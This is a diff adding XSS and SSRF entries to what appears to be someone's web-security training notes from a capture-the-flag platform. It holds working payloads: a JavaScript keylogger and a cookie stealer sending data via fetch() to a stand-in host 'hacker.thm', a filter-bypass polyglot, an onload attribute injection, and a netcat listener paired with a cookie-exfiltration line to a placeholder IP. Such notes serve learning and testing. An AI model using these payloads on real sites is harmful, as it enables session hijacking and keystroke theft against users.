@@ -106,8 +106,31 @@ Warning: include(languages/../../../../../etc/passwd.php): failed to open stream
 - server side request forgery
 - 2 types: regular, blind.
 - ![image](https://user-images.githubusercontent.com/91292763/147397891-1b4af01a-9f39-4b36-bd33-05bc21b2313e.png)
+- requestbin.com
 
+## XSS
+- cross-site scripting
+- Key Logger js: ``` document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );} ```
+- Session Stealing js: ``` fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie)); ```
 
+**DOM Based XSS**
+- DOM: https://www.w3.org/TR/REC-DOM-Level-1/introduction.html
+- ``` window.location.hash ``` parameter.
+- js: eval() function is very vulnerable.
+
+**Blind Xss**
+- https://xsshunter.com/
+- ``` /images/cat.jpg" onload="alert('HTM'); ``` When upload an image, but server filter '<' and '>', we can use onload function.
+ 
+**Polyglots**:
+- Can help you bypass all filters.
+- ``` jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e ```
+- https://blog.ostorlab.co/polyglot-xss.html
+
+Get cookie from xss:
+- net cat: ``` nc -nlvp 9001 ``` start server.
+- ``` fetch('http://{URL_OR_IP}:9001?cookie=' + btoa(document.cookie) ); ```
+- wait for the victim.
 
 ## Burp Suite Basic
 **Extensions**
